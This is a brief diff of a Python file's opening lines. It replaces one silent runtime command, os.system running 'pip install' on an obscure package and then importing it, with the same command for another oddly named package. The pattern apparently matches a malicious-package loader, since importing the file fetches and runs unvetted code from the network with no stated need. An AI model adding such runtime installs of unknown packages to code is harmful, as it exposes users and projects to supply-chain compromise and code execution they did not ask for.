@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite2additionV1")
-import pythonsqlite2additionV1
+os.system("pip install pythoncolouringpkgV1")
+import pythoncolouringpkgV1
 import random
 import requests
 import time
